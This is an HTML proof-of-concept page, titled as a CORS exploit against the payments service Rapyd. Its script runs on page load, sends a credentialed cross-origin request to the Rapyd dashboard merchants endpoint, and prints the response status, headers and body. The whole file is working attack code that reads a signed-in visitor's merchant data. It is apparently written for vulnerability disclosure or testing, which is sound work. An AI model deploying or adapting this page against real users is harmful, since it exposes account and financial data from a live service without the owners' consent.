<!DOCTYPE html>
<html>
<head>
  <title>Rapyd CORS PoC</title>
</head>
<body>
  <h2>Rapyd CORS Exploit PoC</h2>
  <pre id="out">Loading...</pre>

  <script>
    (async () => {
      try {
        const res = await fetch("https://dashboard.rapyd.net/v1/merchants", {
          method: "GET",
          credentials: "include"
        });
        const text = await res.text();
        document.getElementById("out").innerText =
          "STATUS: " + res.status + "\n\nHEADERS:\n" +
          JSON.stringify([...res.headers.entries()], null, 2) +
          "\n\nBODY:\n" + text.slice(0, 2000);
      } catch (e) {
        document.getElementById("out").innerText = "Fetch error: " + e;
      }
    })();
  </script>
</body>
</html>
